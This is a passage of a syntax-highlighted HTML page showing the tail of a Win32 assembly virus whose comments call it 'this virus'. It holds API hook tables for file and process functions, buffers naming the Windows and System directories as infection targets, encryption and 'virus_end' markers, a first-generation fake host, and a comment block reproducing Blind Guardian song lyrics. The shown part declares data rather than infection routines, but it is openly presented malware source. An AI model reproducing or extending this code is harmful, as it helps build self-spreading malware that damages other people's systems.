</span><span class="sc5">WFD_Handles_Count</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">CoolFlag</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">inNT</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">CurrentExt</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">tempcurdir</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">@@Offsetz</span><span class="sc0">               </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">_GetModuleHandleA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_LoadLibraryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_FindClose</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_SetFilePointer</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_SetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_CloseHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetSystemDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_CreateFileMappingA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_MapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_SetEndOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_WriteFile</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetTickCount</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetVersion</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GlobalAlloc</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GlobalFree</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetFileSize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_SetVolumeLabelA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetSystemTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@HookedOffsetz</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">_MoveFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_CopyFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetFullPathNameA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_DeleteFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_WinExec</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_CreateProcessA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_CreateFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_FindFirstFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_FindNextFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetProcAddress</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">n_HookedAPIs</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">@@HookedOffsetz</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">@@USER32_Addresses</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">_SwapMouseButton</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_MessageBoxA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_FindWindowA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_PostMessageA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">@@ADVAPI32_Addresses</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">_RegCreateKeyExA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_RegOpenKeyExA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_RegDeleteKeyA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">MAX_PATH</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">260</span><span class="sc0">

</span><span class="sc5">FILETIME</span><span class="sc0">                </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0">                </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftCreationTime</span><span class="sc0">      </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0">    </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_szFileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">_WFD_dwFileAttributes</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_WFD_ftCreationTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_WFD_ftLastAccessTime</span><span class="sc0">   </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_WFD_ftLastWriteTime</span><span class="sc0">    </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_WFD_nFileSizeHigh</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_WFD_nFileSizeLow</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_WFD_dwReserved0</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_WFD_dwReserved1</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_WFD_szFileName</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SYSTEMTIME</span><span class="sc0">              </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">ST_wYear</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wMonth</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wDayOfWeek</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wDay</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wHour</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wMinute</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wSecond</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wMilliseconds</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">directories</span><span class="sc0">             </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">WindowsDir</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SystemDir</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OriginDir</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">dirs2inf</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">directories</span><span class="sc4">)/</span><span class="sc2">7Fh</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">mirrormirror</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">dirs2inf</span><span class="sc0">

        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">

</span><span class="sc5">crypt_end</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; First generation host</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; I'm alone. I'm with me. I'm thinking. I'm dangerous.</span><span class="sc0">

</span><span class="sc5">fakehost</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">popfd</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szTitle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szMessage</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">             </span><span class="sc5">thorin</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Bonus Track                                                               </span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; As this virus is related with Tolkien, there is also a relation with some</span><span class="sc0">
</span><span class="sc1">; songs of my favourite band: Blind Guardian. And as most of you don't know</span><span class="sc0">
</span><span class="sc1">; a shit about them, here i will put one song: The Bard's Song [in the fo-</span><span class="sc0">
</span><span class="sc1">; rest], that is the hymn of all Blind Guardian's fans. By the way, i have to</span><span class="sc0">
</span><span class="sc1">; wish them good luck, because i've heard that their vocalist had recently an</span><span class="sc0">
</span><span class="sc1">; operation in his ear. Good luck, Hansi!!! We will always love you!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Bard's Song [in the forest]</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; Now you all know</span><span class="sc0">
</span><span class="sc1">; The bards and their songs</span><span class="sc0">
</span><span class="sc1">; When hours have gone by</span><span class="sc0">
</span><span class="sc1">; I'll close my eyes</span><span class="sc0">
</span><span class="sc1">; In a world far away</span><span class="sc0">
</span><span class="sc1">; We may meet again</span><span class="sc0">
</span><span class="sc1">; But now hear my song</span><span class="sc0">
</span><span class="sc1">; About the dawn of the night</span><span class="sc0">
</span><span class="sc1">; Let's sing the bards' song</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Tomorrow will take us away</span><span class="sc0">
</span><span class="sc1">; Far from home</span><span class="sc0">
</span><span class="sc1">; Noone will ever know our names</span><span class="sc0">
</span><span class="sc1">; But the bards' song will remain</span><span class="sc0">
</span><span class="sc1">; Tomorrow will take it away</span><span class="sc0">
</span><span class="sc1">; The fear of today</span><span class="sc0">
</span><span class="sc1">; It will be gone</span><span class="sc0">
</span><span class="sc1">; Due to our magic songs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; There's only one song</span><span class="sc0">
</span><span class="sc1">; Left in my mind</span><span class="sc0">
</span><span class="sc1">; Tales of a brave man</span><span class="sc0">
</span><span class="sc1">; Who lived far from here</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Now the bard songs are over</span><span class="sc0">
</span><span class="sc1">; And it's time to leave</span><span class="sc0">
</span><span class="sc1">; Noone should ask you for the name</span><span class="sc0">
</span><span class="sc1">; Of the one</span><span class="sc0">
</span><span class="sc1">; Who tells the story</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Tomorrow will take us away</span><span class="sc0">
</span><span class="sc1">; Far from home</span><span class="sc0">
</span><span class="sc1">; Noone will ever know our names</span><span class="sc0">
</span><span class="sc1">; But the bards' song will remain</span><span class="sc0">
</span><span class="sc1">; Tomorrow all will be known</span><span class="sc0">
</span><span class="sc1">; And you are not alone</span><span class="sc0">
</span><span class="sc1">; So don't be afraid</span><span class="sc0">
</span><span class="sc1">; In the dark and cold</span><span class="sc0">
</span><span class="sc1">; 'Cause the bards' song will remain</span><span class="sc0">
</span><span class="sc1">; They all will remain</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; In my thoughts and dreams</span><span class="sc0">
</span><span class="sc1">; They're always in my mind</span><span class="sc0">
</span><span class="sc1">; These songs from hobbits, dwarves and men</span><span class="sc0">
</span><span class="sc1">; And elves</span><span class="sc0">
</span><span class="sc1">; Come close your eyes</span><span class="sc0">
</span><span class="sc1">; You can see them, too</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ---</span><span class="sc0">
</span><span class="sc1">; Copyright (c) 1992 by Blind Guardian; "Somewhere far beyond" album.</span><span class="sc0">




</span></div></body>
</html>
